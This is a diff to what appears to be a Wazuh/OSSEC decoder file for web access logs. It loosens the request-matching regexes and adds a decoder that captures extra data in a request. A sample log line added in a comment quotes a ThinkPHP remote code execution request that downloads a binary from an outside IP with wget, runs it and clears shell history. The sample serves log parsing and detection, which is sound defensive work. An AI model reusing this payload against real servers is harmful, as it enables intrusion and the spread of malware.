@@ -25,18 +25,23 @@
 
   2 IPs:
   10.10.10.11 10.10.10.12 - - [10/Apr/2017:13:18:05 -0700] "GET /injection/%0d%0aSet-Cookie HTTP/1.1" 404 271 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0"
+
+  With extradata:
+  27.127.152.33 - - [23/Apr/2019:13:40:39 +0200] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.131/x86 -O .Akari; chmod +x .Akari; rm -rf .Akari x86; history -c -w;exit;logout;' HTTP/1.1" 400 166 "-" "Akari(selfrep)" "-"
+
   -->
+
 
 <decoder name="web-accesslog">
     <type>web-log</type>
-    <prematch>^\S+ \S+ \S+ \.*[\S+ \S\d+] "\w+ \S+ HTTP\S+" </prematch>
+    <prematch>^\S+ \S+ \S+ \.*[\S+ \S\d+] "\w+ \S+ \.*HTTP\S+" </prematch>
 </decoder>
 
 <decoder name="web-accesslog-domain">
     <type>web-log</type>
     <parent>web-accesslog</parent>
     <prematch>^\S+.\D+</prematch>
-    <regex>^\S+ (\S+) \S+ \.*[\S+ \S\d+] "(\w+) (\S+) HTTP\S+" (\d+) </regex>
+    <regex>^\S+ (\S+) \S+ \.*[\S+ \S\d+] "(\w+) (\S+) \.*HTTP\S+" (\d+) </regex>
     <order>srcip, protocol, url, id</order>
 </decoder>
 
@@ -44,13 +49,20 @@
     <type>web-log</type>
     <parent>web-accesslog</parent>
     <prematch>^\S+ \S+.\S+ |^\S+ \S+:\S+ </prematch>
-    <regex>^(\S+) (\S+) \S+ \.*[\S+ \S\d+] "(\w+) (\S+) HTTP\S+" (\d+) </regex>
+    <regex>^(\S+) (\S+) \S+ \.*[\S+ \S\d+] "(\w+) (\S+) \.*HTTP\S+" (\d+) </regex>
     <order>srcip2, srcip, protocol, url, id</order>
+</decoder>
+
+<decoder name="web-accesslog-action">
+    <type>web-log</type>
+    <parent>web-accesslog</parent>
+    <regex>^(\S+) \S+ \S+ \.*[\S+ \S\d+] "(\w+) (\S+) (\.*)HTTP\S+" (\d+) </regex>
+    <order>srcip, protocol, url, extra_data, id</order>
 </decoder>
 
 <decoder name="web-accesslog-ip">
     <type>web-log</type>
     <parent>web-accesslog</parent>
-    <regex>^(\S+) \S+ \S+ \.*[\S+ \S\d+] "(\w+) (\S+) HTTP\S+" (\d+) </regex>
+    <regex>^(\S+) \S+ \S+ \.*[\S+ \S\d+] "(\w+) (\S+) \.*HTTP\S+" (\d+) </regex>
     <order>srcip, protocol, url, id</order>
 </decoder>
